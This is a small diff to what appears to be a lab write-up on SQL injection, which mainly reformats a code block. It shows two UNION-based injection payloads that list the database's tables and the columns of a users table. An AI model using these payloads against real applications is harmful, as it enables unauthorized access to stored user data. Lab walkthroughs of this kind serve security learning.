@@ -40,11 +40,14 @@ Response: HTTP/2 200 OK
 ```sql
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 ```
+
 This displayed several tables within the database including users_omjluk.
 
 ![burpsuite response](./misc-images/08-1.png)
 
+```sql
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_omjluk'--
+```
 
 ![burpsuite response](./misc-images/08-2.png)
 
